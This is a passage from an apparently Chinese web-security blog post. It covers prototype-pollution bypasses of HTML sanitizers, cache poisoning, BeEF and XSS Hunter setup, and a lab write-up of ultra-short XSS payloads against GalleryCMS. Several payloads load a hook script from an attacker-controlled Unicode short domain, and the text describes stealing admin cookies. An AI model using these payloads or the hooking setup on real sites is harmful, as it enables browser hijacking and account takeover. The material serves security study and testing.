Object.prototype.length = 10;Object.prototype[0] = 'test';</code> , 然后 <code>ALLOWED_ELEMENTS.length</code>  仍然返回 <code>4</code>  并且 <code>ALLOWED_ELEMENTS[0]</code>  仍然是 <code>&quot;h1&quot;</code> 。</p>\n<p>另一种解决方案是存储一个包含允许元素的对象，例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const ALLOWED_ELEMENTS = &#123; &quot;h1&quot;: true, &quot;i&quot;: true, &quot;b&quot;: true, &quot;div&quot; :true&#125;</span><br></pre></td></tr></table></figure>\n<p>然后检查是否允许某些元素，库可能会检查 <code>ALLOWED_ELEMENTS[element]</code> . 这种方法很容易通过原型污染加以利用；因为如果我们通过以下方式污染原型：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.prototype.SCRIPT = true;</span><br></pre></td></tr></table></figure>\n<p>然后 <code>ALLOWED_ELEMENTS[&quot;SCRIPT&quot;]</code>  返回 <code>true</code> 。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220427192220087.png\" alt=\"image-20220427192220087\"></p>\n<h3 id=\"通过原型链污染bypass-dompurify\"><a class=\"markdownIt-Anchor\" href=\"#通过原型链污染bypass-dompurify\">#</a> 通过原型链污染 bypass DOMPurify</h3>\n<p>与之前的 sanitizer 类似，DOMPurify 的基本用法非常简单：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-8.png\" alt=\"img\"></p>\n<p>DOMPurify 还接受带有配置的第二个参数。这里还出现了一种使其容易受到原型污染的模式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">      /* Set configuration parameters */</span><br><span class=\"line\">ALLOWED_TAGS = &#x27;ALLOWED_TAGS&#x27; in cfg ? addToSet(&#123;&#125;, cfg.ALLOWED_TAGS) : DEFAULT_ALLOWED_TAGS;</span><br><span class=\"line\">ALLOWED_ATTR = &#x27;ALLOWED_ATTR&#x27; in cfg ? addToSet(&#123;&#125;, cfg.ALLOWED_ATTR) : DEFAULT_ALLOWED_ATTR;</span><br></pre></td></tr></table></figure>\n<p>在 JavaScript 中 <code>in</code> ，运算符遍历原型链。因此 <code>'ALLOWED_ATTR' in cfg</code> ，如果此属性存在于 <code>Object.prototype</code> .</p>\n<p>DOMPurify 默认允许使用 <code>&lt;img&gt;</code>  标签，因此该漏洞利用只需要 <code>ALLOWED_ATTR</code>  使用 <code>onerror</code>  和进行污染 <code>src</code> 。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-9.png\" alt=\"img\"></p>\n<p>其他通过原型链污染 bypass xss 过滤框架不在叙述，可以到参考文献中查看</p>\n<h3 id=\"ctf案例原型链污染\"><a class=\"markdownIt-Anchor\" href=\"#ctf案例原型链污染\">#</a> CTF 案例：原型链污染</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s\">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</span></p>\n<p>难度太大，就不班门弄斧了…</p>\n<h2 id=\"缓存投毒\"><a class=\"markdownIt-Anchor\" href=\"#缓存投毒\">#</a> 缓存投毒</h2>\n<p>Web 缓存位于用户和应用程序服务器之间，用于保存和提供某些响应的副本。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015170751343.png\" alt=\"image-20221015170751343\"></p>\n<p>缓存技术旨在通过减少延迟来加速页面加载，还可以减少应用程序服务器上的负载。可以使用 Varnish 或 CDN 设置网站的缓存</p>\n<p>每当缓存服务收到对资源的请求时，它需要确定它是否已经保存了这个指定资源的副本，并且可以使用该副本进行响应，或者是否需要将请求转发给应用程序服务器。</p>\n<p>确定两个请求是否正在尝试加载相同的资源可能是很棘手的问题；对请求进行逐字节匹配的做法是完全无效的，因为 HTTP 请求充满了无关紧要的数据，例如请求头中的 User-Agent 字段</p>\n<p>缓存使用缓存键的概念解决了这个问题 – 使用一些特定要素用于完全标识所请求的资源，但可能导致缓存系统错误认为两个缓存键相同但其他参数不同的请求是等效的，将返回错误的数据。</p>\n<p>Web 缓存投毒的目的是发送导致有害响应的请求，将该响应将保存在缓存服务中并提供给其他用户。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015171200570.png\" alt=\"image-20221015171200570\"></p>\n<p>非缓存键出现在错误的地方，可以来自于 HTTP 请求头，HTTP 响应，路由，DOM 等。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220427202534867.png\" alt=\"image-20220427202534867\"></p>\n<p>识别缓存键可以使用如下插件～：burpsuite param miner</p>\n<p>详细可以看这个文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTU2MzU2\">https://www.anquanke.com/post/id/156356</span></p>\n<p>对应的 burpsuite 也有相应的靶场</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmc=\">Web cache poisoning | Web Security Academy (portswigger.net)</span></p>\n<p>防御：</p>\n<p>针对缓存投毒的最强大防御办法就是禁用缓存。</p>\n<p>如果您对确定哪些内容是 “静态” 的足够确认，那么只对纯静态的响应进行缓存也是有效的。</p>\n<p>同样，避免从请求头和 cookie 中获取输入是防止缓存投毒的有效方法，但很难知道其他层和框架是否在偷偷支持额外的请求头。</p>\n<p>一旦在应用程序中识别出非缓存键的输入，理想的解决方案就是彻底禁用它们。</p>\n<p>最后，无论您的应用程序是否使用缓存技术，你的某些客户端可能在其末端都存在缓存，因此不应忽视 HTTP 请求头中的 XSS 等客户端漏洞。</p>\n<h2 id=\"奇技淫巧\"><a class=\"markdownIt-Anchor\" href=\"#奇技淫巧\">#</a> 奇技淫巧</h2>\n<h3 id=\"1通过特殊字符绕过或缩短playload和src长度\"><a class=\"markdownIt-Anchor\" href=\"#1通过特殊字符绕过或缩短playload和src长度\">#</a> 1. 通过特殊字符绕过或缩短 playload 和 src 长度</h3>\n<p>利用浏览器对 Unicode 兼容性构造 script 中短 src</p>\n<script src=//℡℠.㎺>\n\n浏览器可以解析为telsm.pw，但length只有4个字符\n\nhttps://github.com/filedescriptor/Unicode-Mapping-on-Domain-names\n\nhttps://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html\n\nſ\n\nß\n\nTEL\n\nSR\n\nPW\n\n![img](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458305697-1322263c-c705-44d7-a748-39c6b62ac182.png)\n\n利用浏览器对UNiocode支持\n\n![img](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458342308-390ae321-9b7c-49c0-9fbf-9952ee801d68.png)\n\n### 1.1 案例：emersion of XSS with 20 characters limitation\n\n### 1.Xss platform\n\n### 1.1beef-xss\n\n安装：`apt-get install beef-xss`\n\n注意事项：\n\n几种常见的安装报错：\n\n1.更新apt源\n\n![image-20220910205931724](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910205931724.png)\n\n\n\n解决方法：`apt-get update ` `sudo apt-get upgrade`\n\n2.缺省依赖\n\n![image-20220910210020518](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210020518.png)\n\n解决方法:`apt-get install libglib2.0-dev `\n\n安装完之后在进行`apt-get install beef-xss`\n\n\n\nbeef默认路径：`http://127.0.0.1:3000/ui/panel`\n\n![image-20220910210358884](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210358884.png)\n\n\n\n使用pkav测试：\n\n使用系统提供的payload\n\n![image-20220910233217661](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233217661.png)\n\n![image-20220910211111241](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211111241.png)\n\n此时再去beef panel查看\n\n![image-20220910211138801](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211138801.png)\n\n说明此时已经上线，可以在command中找到命令执行：\n\n说明：\n\n- 绿色模块：表示模块适用当前用户，并且执行结果对用户不可见\n- 红色模块：表示模块不适用当前用户，有些红色模块也可以执行\n- 橙色模块：模块可用，但结果对用户可见\n- 灰色模块：模块为在目标浏览器上测试过\n\n最重要的是可以看到cookies，如果对方是管理员登录，那么我们便可以使用管理员cookie进行登录\n\n![image-20220910211534847](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211534847.png)\n\n### 2.XSS-hunter\n\nhttps://xsshunter.com/\n\n1.进行注册\n\n![image-20220910232621209](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232621209.png)\n\n2.注册完后系统会自动登录，在XSS fires页面，如果有已经上线的主机会在此显示，payloads页面提供了一些xsspayload\n\n![image-20220910232730320](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232730320.png)\n\n3.如果成功上线，会显示如下界面，full report 里面会有后台地址和cookies\n\n![image-20220910233046239](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233046239.png)\n\n\n\n### 2.1 在centos上安装beef-xss\n\n参考链接：[CentOS安装beEF做XSS平台 - 海鸥博客 - 博客园 (cnblogs.com)](https://www.cnblogs.com/comdodo/p/5506996.html)\n\n但有些需要注意的点\n\n1.上文中的启动rvm不一定是在etc下，是在你自己的安装目录下，启动完后使用rvm 输出版本测试是否成功\n\n我是用如下方法安装成功，因为我是在用户家目录安装的，注意修改rvm版本，是你安装得版本\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd ~/.rvm/archives</span><br><span class=\"line\">tar xvzf rvm-1.26.0.tgz # or whatever RVM version you have</span><br></pre></td></tr></table></figure>\n\n这将解压缩文件夹，其中将有一个名为 scripts 的文件夹。 现在运行以下命令。\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source ~/.rvm/archives/rvm-1.26.11/scripts/rvm</span><br></pre></td></tr></table></figure>\n\n然后rvm命令就可以正常运行了\n\n2.安装ruby时报错没有足够空间：找到安装rvm的目录的/rvm/archives/rvm/scripts/functions/utility文件，\n\n搜索“df”行，您将找到此代码将：\n\n` __free_space=\"$( \\command \\df \"$1\" | __rvm_awk 'BEGIN{x=4} /Free/{x=3} $3==\"Avail\"{x=3} END{print $x}' )\"`\n\n改为\n\n`__free_space=\"999999\"`\n\n同时为了防止checksum报错，需要加参数--verify downloads 2，这个参数不一定有用，建议采用第三条代替\n\n3.安装ruby时可能会非常非常~慢，需要先更改rvm源，其实就和你更改yum源为ali一样的道理\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;ruby_url=https://cache.ruby-china.com/pub/ruby&quot; &gt; /usr/local/rvm/user/db</span><br><span class=\"line\">注意： 最后的路径要取决于你的安装路径，比如我的就在  ~/.rvm/user/db</span><br><span class=\"line\">然后就可以安装 rvm install 2.7</span><br></pre></td></tr></table></figure>\n\n4.提示\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ERROR:  SSL verification error at depth 0: ok (0)</span><br><span class=\"line\">Error fetching https://ruby.taobao.org/:</span><br></pre></td></tr></table></figure>\n\n更换gem源，参考链接[RubyGems 镜像 - Ruby China (ruby-china.com)](https://gems.ruby-china.com/)\n\n5.下载beef  [Kali Linux / Packages / beef-xss · GitLab](https://gitlab.com/kalilinux/packages/beef-xss)\n\n[GitHub - beefproject/beef: The Browser Exploitation Framework Project](https://github.com/beefproject/beef) \n\n建议使用第二个\n\n注意：下载此版本ruby版本必须>3.0.3\n\n6.报错`There was an error while trying to write to /www/wwwroot/www.radsm.co/beef/beef-xss/.bundle/config. It is likely that you need to grant write permissions for that path.`\n\nsudo给对应的文件夹递归加权限即可\n\n7.报错`in autodetect': Could not find a JavaScript runtime.`\n\n安装nodejs即可 `yum install nodejs`\n\n8.安装bundle install时非常慢，可以更新bundle源\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bundle config mirror.https://rubygems.org https://mirrors.tuna.tsinghua.edu.cn/rubygems</span><br></pre></td></tr></table></figure>\n\n9.显示`/home/lighthouse/.rvm/gems/ruby-3.0.3@beef/gems/activerecord-7.0.3.1/lib/active_record/connection_adapters/sqlite3_adapter.rb:349:in check_version': Your version of SQLite (3.7.17) is too old. Active Record supports SQLite >= 3.8. (RuntimeError)`\n\n解决方法：\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-devel-3.8.11-1.fc21.x86_64.rpm</span><br><span class=\"line\">$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-3.8.11-1.fc21.x86_64.rpm</span><br><span class=\"line\">$ sudo yum install sqlite-3.8.11-1.fc21.x86_64.rpm sqlite-devel-3.8.11-1.fc21.x86_64.rpm</span><br></pre></td></tr></table></figure>\n\n10.报错\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[14:15:27][!] ERROR: Default username and password in use!</span><br><span class=\"line\">[14:15:27]    |_  Change the beef.credentials.passwd in config.yaml</span><br></pre></td></tr></table></figure>\n\n解决方法：\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim config.yaml   </span><br><span class=\"line\">更改默认密码</span><br></pre></td></tr></table></figure>\n\n也可以参考一下这篇[RVM 安装 Ruby - 大数据从业者FelixZh - 博客园 (cnblogs.com)](https://www.cnblogs.com/felixzh/p/8081622.html)\n\n[安装rvm,升级ruby。跳的坑，做个记录 - 简书 (jianshu.com)](https://www.jianshu.com/p/12d3226d83ee)\n\n但我明显碰到了更多奇奇怪怪的问题\n\n总结：不要再centos上安装beef会变得不幸\n\n\n\n### 2.使用45,40，或者20个字符绕过xss长度限制\n\n下面使用gallerycms进行测试，原因是它采用jQuery框架，可以测试某些情况下的最短payload\n\n### 2.1gallerycms安装\n\n1.报错解决方法：\n\n![image-20220911001606531](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001606531.png)\n\n1.修改\\application\\config\\database.php中的数据库密码，并且创建对应数据库\n\n2.切换php版本为5.X，因为该CMS使用旧版的CI框架\n\n\n\n2.随便注册，登录，此处的Album Name就是注入点\n\n![image-20220911001755992](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001755992.png)\n\n\n\n### 2.2使用短域名绕过字符限制\n\n短域名定义：通过Unicode编码使Unicode中一个字符被浏览器解析为两个或三个字符，最典型的有如下\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ﬀ expands to `ff`</span><br><span class=\"line\">℠ expands to `sm`</span><br><span class=\"line\">㏛ expands to `sr`</span><br><span class=\"line\">ﬆ expands to `st`</span><br><span class=\"line\">㎭ expands to `rad`</span><br><span class=\"line\">℡ expands to `tel`</span><br></pre></td></tr></table></figure>\n\n因此我们就可以使用Unicode编码来缩短域名长度\n\n因此我注册了一个域名`radsm.co`,使用Unicode表示为`㎭℠.co`。相比之前减少了三个字符\n\n最极限的情况是使用`℡℠.㎺`,注意这里pw其实也是一个字符，我们可以只用四个字符构造一个域名，但我买的时候忘了pw。。。。\n\nhttps://github.com/filedescriptor/Unicode-Mapping-on-Domain-names\n\nhttps://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html\n\n后来想起来不止这几个，其实极限域名甚至可以更短。。。\n\n\n\n##### 1.没有禁止script标签的情况\n\n使用xsshunt平台：\n\n`<script/src=https://㎭℠.xss.ht>`    \n\n此时该payload为30个字符\n\n使用beef-xss平台\n\n`<script/src=http://㎭℠.co:3000/hook.js>`\n\n此时该payload为30个字符\n\n但注意：src中不加\"\" 也可以正常解析，同时不加协议也可以正常解析\n\n\n\n对于xsshunter平台，由于使用的是他的子域名，无法在变短，但我们可以使用域名重定向，将我们自己的域名重定向到xsshunter的域名\n\n注意：国内的域名不支持重定向\n\n![image-20220911004504679](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004504679.png)\n\n\n\n\n\n对于beef-xss平台，由于hook.js这个路径太占长度，我们可以将hook.js写到index.html中，并且将网站使用默认端口省掉:3000这些字符\n\n![image-20220911004816278](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004816278.png)\n\n此时我们的极限payload为`<script/src=//㎭℠.㎺>`\n\n![image-20220911005113131](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911005113131.png)\n\n此时我们可以在19个长度内完成\n\n\n\n##### 2前端框架为jQuery，可以使用如下payload：\n\n不过滤script标签：\n\n注意此payload不能缺少\"\" ，同样需要把hook.js放到index.html中\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;$.getScript(&quot;//㎭℠.co&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n![image-20220911194433247](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911194433247.png)\n\n过滤script标签\n\n如果没有过滤svg标签。那么此时的payload为：\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg/onload=$.getScript(&quot;//㎭℠.co&quot;)&gt;</span><br></pre></td></tr></table></figure>\n\n![image-20220911195539757](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911195539757.png)\n\n\n\n\n\n##### 3.绕过GalleryCMS\n\n对于用户的输入，gallerycms做了严格的过滤，包括 从长度和内容限制\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">  </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// Validate form.</span></span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;load-&gt;<span class=\"title function_ invoke__\">helper</span>(<span class=\"string\">&#x27;form&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;load-&gt;<span class=\"title function_ invoke__\">library</span>(<span class=\"string\">&#x27;form_validation&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;form_validation-&gt;<span class=\"title function_ invoke__\">set_error_delimiters</span>(<span class=\"string\">&#x27;&lt;div class=&quot;alert alert-error&quot;&gt;&lt;strong&gt;Error: &lt;/strong&gt;&#x27;</span>, <span class=\"string\">&#x27;&lt;/div&gt;&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$user_data</span> = <span class=\"variable language_\">$this</span>-&gt;session-&gt;<span class=\"title function_ invoke__\">all_userdata</span>();</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;form_validation-&gt;<span class=\"title function_ invoke__\">set_rules</span>(<span class=\"string\">&#x27;album_name&#x27;</span>, <span class=\"string\">&#x27;Album Name&#x27;</span>, <span class=\"string\">&#x27;trim|required|max_length[45]|xss_clean&#x27;</span>);</span><br><span class=\"line\">    ...</span><br></pre></td></tr></table></figure>\n\n\n\n###### 假设没有xss_clean的绕过\n\n注意：我买的域名被腾讯与搞了，无法解析，因此只能用一些奇技淫巧了\n\n比如：我虚拟机的kali的ip是192.168.13.133，我的gallerycms部署在本机上，我在本机上host文件加一个dns解析，将radsm.co解析到192.168.13.133\n\n![image-20220911201545877](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911201545877.png)\n\n但要是这样我tm白搭了一天的beef...\n\n这样我们的payload就会变长，我使用的端口为18888，访问时就会变成radsm.co:18888\n\n我们做一下减法payload会多出6个字符，到时候能解析的时候我们的payload就可以少六个\n\n\n\n1.payload长度限制为50时\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;$.getScript(&quot;//㎭℠.co&quot;)&lt;/script&gt;</span><br><span class=\"line\">payload 中&quot;&quot; 和后半个闭合标签都不能缺少</span><br></pre></td></tr></table></figure>\n\n![image-20220911231941383](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911231941383.png)\n\n2.payload长度限制为40时\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=//㎭℠.co&gt;&#x27;.length</span><br></pre></td></tr></table></figure>\n\n![image-20220911232202908](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911232202908.png)\n\n\n\n###### 存在xss_clean并且长度限制为45个字符时\n\n利用XSS_clean 漏过滤的svg来绕过\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg/onload=$.getScript(&quot;//㎭℠.co&quot;)&gt;</span><br></pre></td></tr></table></figure>\n\n注意：如果此时在index.html内写入hook.js，并且使用宝塔面板，一定记着把bt自己的初始页的东西删光，不然无法上线\n\n并且bt使用自己的默认index.html的，在/www/server/panel下，具体可以去bt看，这个也一定要删掉或者完全改写，否则不会访问你站点首页的自己的index.html的\n\n\n\n还有一件很诡异的事，我gallerycms搭建在本机192.168.2.13上，beef-xss在kali 192.168.13.133上，在一样的payload前提下，在本机上始终无法上线，但在kali上就可以，本机上进行了域名和ip的尝试，始终不行，最后在kali访问本机的gallerycms成功上线\n\n\n\n补充:gallerycms的对新建album的过滤在application/controllers/album.php中，修改长度在这个文件里就能修改前端限制\n\n\n\n+1补充：本篇文件缺少一些xss的基础知识，如果看不懂先看[(49条消息) XSS详解及复现gallerycms字符长度限制短域名绕过_薄荷加冰心有多冷的博客-CSDN博客](https://blog.csdn.net/weixin_44811851/article/details/126080728)\n\n这个大佬写的文章\n\n\n\n\n\n\n\n### 3.通过特殊字符变为大写后长度变为原来两倍偷渡非法字符\n\nhttps://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/\n\n假設我有個字串是 `ßßßßßßßß<b>1</b>`，長度是 16，所以在初始化的時候 length 會是 16，但是當跑到迴圈的時候因為轉成大寫，會是 `8*2+8` = 24 個字，所以 24 個字會全部被寫進去 buf 裡面。\n\n在 `mock` 函式裡面，只會檢查 length 內的東西，所以最後 8 個字不會被檢查到，可以偷渡 `<>` 這些字元進去\n\n### 4.利用SVG/details绕过先抓取元素再赋值\n\ndocument.querySelector( '.note').innerHTML = text;\n\n\n\n\n\n## 补充：httponly\n\n> 　Cookie分为内存Cookie和硬盘Cookie，内存Cookie储存在浏览器内存中，关闭浏览器则消失。如果是想要利用保存在内存中的Cookie，需要获取到用户Cookie+用户浏览器未关闭。如果是硬盘Cookie，则该Cookie是一段时间有效的（有的时候我们登录网站会出现保持登录状态的选项，即保存在硬盘中），这类Cookie获取到后在其有效期内都是可以进行受害者用户身份登录的，进而实现入侵。\n>\n> 　　Cookie由变量名与值组成，其属性里有标准的cookie变量，也有用户自定义的属性。Cookie保存在浏览器的document对象中，对于存在XSS漏洞的网站，入侵者可以插入简单的XSS语句执行任意的JS脚本，以XSS攻击的手段获取网站其余用户的Cookie。\n>\n> 比如，举个简单例子：`<script>alert(document.cookie)</script>`\n<blockquote>\n<p>Cookie 是通过 http response header 种到浏览器的，设置 Cookie 的语法为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie:=[;=][;expiress=][;domain=][;path=][;secure][;httponly]</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029192451385.png\" alt=\"image-20221029192451385\"></p>\n<p>Cookie 各个参数详细内容：</p>\n<ul>\n<li>Set-Cookie:http 响应头，向客户端发送 Cookie。</li>\n<li>Name=value: 每个 Cookie 必须包含的内容。</li>\n<li>Expires=date:EXpires 确定了 Cookie 的有效终止日期，可选。如果缺省，则 Cookie 不保存在硬盘中，只保存在浏览器内存中。</li>\n<li>Domain=domain-name: 确定了哪些 inernet 域中的 web 服务器可读取浏览器储存的 Cookie，缺省为该 web 服务器域名。</li>\n<li>Path=path: 定义了 web 服务器哪些路径下的页面可获取服务器发送的 Cookie。</li>\n<li>Secure: 在 cookie 中标记该变量，表明只有为 https 通信协议时，浏览器才向服务器提交 Cookie。</li>\n<li><strong>Httponly: 禁止 javascript 读取，如果 cookie 中的一个参数带有 httponly，则这个参数将不能被 javascript 获取；httponly 可以防止 xss 会话劫持攻击。</strong></li>\n</ul>\n<p>有的网站为了防止 XSS，所以采用浏览器绑定技术，例如将 Cookie 和浏览器的 User-agent 进行绑定，一旦发现绑定不匹配则认为 Cookie 失效，但是这种方法存在很大的弊端，因为当入侵者获取到 Cookie 的同时也能获取到用户的 User-agent; 另一种防止 XSS 获取用户 Cookie 的方式是将 Cookie 和 Remote-addr 相绑定（即与 IP 绑定），但是这样的弊端是可能会带来极差的用户体验，如家里的 ADSL 拨号上网就是每次拨号连接更换一个 IP 地址。</p>\n<p>所以 HttpOnly 就应运而生了。<strong>具体含义就是，如果某个 Cookie 带有 HttpOnly 属性，那么这一条 Cookie 将被禁止读取，也就是说，JavaScript 读取不到此条 Cookie，不过在用户与服务端交互的时候，HttpRequest 包中仍然会带上这个 Cookie 信息，即用户与服务端的正常交互不受影响。如果支持 HttpOnly 的浏览器检测到包含 HttpOnly 标志的 cookie，并且客户端脚本代码尝试读取该 cookie，则浏览器将返回一个空字符串作为结果。</strong></p>\n<p>使用了 HttpOnly 只是在一定程度上抵御 XSS 盗取 Cookie 的行为，另外 HttpOnly 也不能防止入侵者做 AJAX 提交。严格来说 HttpOnly 并不是为了对抗 XSS，<strong>它解决的是 XSS 后的 Cookie 劫持问题</strong>，但是 XSS 攻击带来的不仅仅是 Cookie 劫持问题，还有窃取用户信息，模拟身份登录，操作用户账户等一系列问题。所以除了 HttpOnly 之外还需要其他的对抗解决方案。</p>\n</blockquote>\n<h2 id=\"参考\"><a class=\"markdownIt-Anchor\" href=\"#参考\">#</a> 参考</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTAyMjkxMDgyMTE0OTMxMg==\">JavaScript 教程 - 廖雪峰的官方网站 (liaoxuefeng.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93YW5nZG9jLmNvbS9qYXZhc2NyaXB0Lw==\">JavaScript 教程 - 网道 (wangdoc.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdA==\">JavaScript | MDN (mozilla.org)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYm9va3N0YWNrLmNuL3JlYWQvamF2YXNjcmlwdC10dXRvcmlhbC9SRUFETUUubWQ=\">介绍 - 《阮一峰 JavaScript 教程》</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZXNlYXJjaC5zZWN1cml0dW0uY29tLw==\">research.securitum.com - securitum.com vulnerabilities researches and cyber security education publications</span></p>\n<p><span class=\"exturl\" 